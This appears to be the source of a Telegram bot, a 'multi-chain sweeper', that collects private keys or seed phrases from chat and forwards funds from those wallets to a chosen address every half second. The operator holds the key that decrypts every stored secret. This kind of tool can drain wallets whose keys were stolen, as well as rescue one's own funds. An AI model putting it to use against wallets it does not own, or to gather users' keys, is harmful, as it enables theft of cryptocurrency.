from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    ConversationHandler, CallbackQueryHandler, MessageHandler, filters
)
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet
import threading
from threading import Lock

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- CONFIG ----------------
app = Flask(__name__)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
SECRET_KEY = os.getenv("SECRET_KEY")
PORT = int(os.getenv("PORT", 5000))

cipher = Fernet(SECRET_KEY.encode())
data_store = {}
data_lock = Lock()
sweeper_running = True

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data_store = {int(k): v for k, v in json.load(f).items()}
            logger.info(f"✅ Loaded {sum(len(v) for v in data_store.values())} wallets")
        except Exception as e:
            logger.error(f"Load error: {e}")

def save_data():
    try:
        with data_lock:
            with open(DATA_FILE, "w") as f:
                json.dump(data_store, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")

# ---------------- FLASK ----------------
@app.route("/")
def home():
    return "Bot is alive ✅"

# Conversation States
CHAIN, TYPE_CHOICE, SECRET, DESTINATION = range(4)

def main_menu():
    keyboard = [
        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet")],
        [InlineKeyboardButton("📋 My Wallets", callback_data="my_wallets")],
        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove_last")],
        [InlineKeyboardButton("⏺ Toggle Sweeper", callback_data="toggle")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------------- BOT HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡ **Fast Multi-Chain Sweeper**", 
                                  parse_mode="Markdown", reply_markup=main_menu())

async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "add_wallet":
        keyboard = [[InlineKeyboardButton(c.upper(), callback_data=c)] for c in ["solana","ethereum","bsc"]]
        await query.edit_message_text("**Select Chain:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        return CHAIN

    elif data == "my_wallets":
        await show_wallets(query)
    elif data == "remove_last":
        await remove_last(query)
    elif data == "toggle":
        global sweeper_running
        sweeper_running = not sweeper_running
        status = "🟢 Running" if sweeper_running else "⭕ Stopped"
        await query.edit_message_text(f"Sweeper: {status}", reply_markup=main_menu())

async def chain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["chain"] = query.data
    keyboard = [
        [InlineKeyboardButton("🔑 Private Key", callback_data="private_key")],
        [InlineKeyboardButton("📜 Seed Phrase", callback_data="seed_phrase")]
    ]
    await query.edit_message_text("**Choose Type:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
    return TYPE_CHOICE

async def type_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["type"] = query.data
    await query.edit_message_text("Paste your **Secret** (Private Key or Seed Phrase):")
    return SECRET

async def receive_secret(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["secret"] = update.message.text.strip()
    await update.message.reply_text("Now paste the **Destination Wallet Address**:")
    return DESTINATION

async def receive_destination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chain = context.user_data.get("chain")
    secret = context.user_data.get("secret")
    destination = update.message.text.strip()

    wallet = {
        "chain": chain,
        "type": context.user_data.get("type"),
        "secret": encrypt(secret),
        "destination": destination
    }

    with data_lock:
        data_store.setdefault(user_id, []).append(wallet)
        save_data()

    await update.message.reply_text(f"✅ **Success!**\nChain: {chain.upper()}\nDestination: {destination}", 
                                  reply_markup=main_menu())
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu())
    context.user_data.clear()
    return ConversationHandler.END

# Quick Actions
async def show_wallets(query):
    user_id = query.from_user.id
    with data_lock:
        wallets = data_store.get(user_id, [])
    text = "📋 **Your Wallets**\n\n" if wallets else "No wallets yet."
    for i, w in enumerate(wallets):
        text += f"{i+1}. {w['chain'].upper()} → `{w['destination'][:12]}...`\n"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def remove_last(query):
    user_id = query.from_user.id
    with data_lock:
        if user_id in data_store and data_store[user_id]:
            data_store[user_id].pop()
            if not data_store[user_id]:
                del data_store[user_id]
            save_data()
            await query.edit_message_text("🗑 Last wallet removed.", reply_markup=main_menu())
        else:
            await query.edit_message_text("Nothing to remove.", reply_markup=main_menu())

# ---------------- FAST SWEEPER ----------------
async def sweeper_loop():
    logger.info("🚀 Fast Sweeper Started (0.5s)")
    while True:
        if sweeper_running:
            tasks = []
            with data_lock:
                current = list(data_store.items())
            for user_id, wallets in current:
                for wallet in wallets:
                    tasks.append(process_wallet(user_id, wallet))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.5)

async def process_wallet(user_id, wallet):
    try:
        secret = decrypt(wallet["secret"])
        func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
        await asyncio.to_thread(func, secret, wallet["destination"], user_id)
    except Exception as e:
        logger.error(f"Error: {e}")

# ---------------- MAIN ----------------
async def main():
    load_data()
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(main_button)],
        states={
            CHAIN: [CallbackQueryHandler(chain_selected)],
            TYPE_CHOICE: [CallbackQueryHandler(type_selected)],
            SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
            DESTINATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)

    asyncio.create_task(sweeper_loop())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True
    ).start()
    asyncio.run(main())